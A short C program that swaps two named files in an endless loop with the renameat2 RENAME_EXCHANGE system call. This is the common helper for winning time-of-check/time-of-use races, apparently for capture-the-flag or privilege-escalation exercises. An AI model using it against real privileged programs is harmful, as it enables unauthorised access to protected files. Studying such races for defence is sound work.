#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <file1> <file2>\n", argv[0]);
        return 1;
    }

    while (1) {
        syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
    }

    return 0;
}

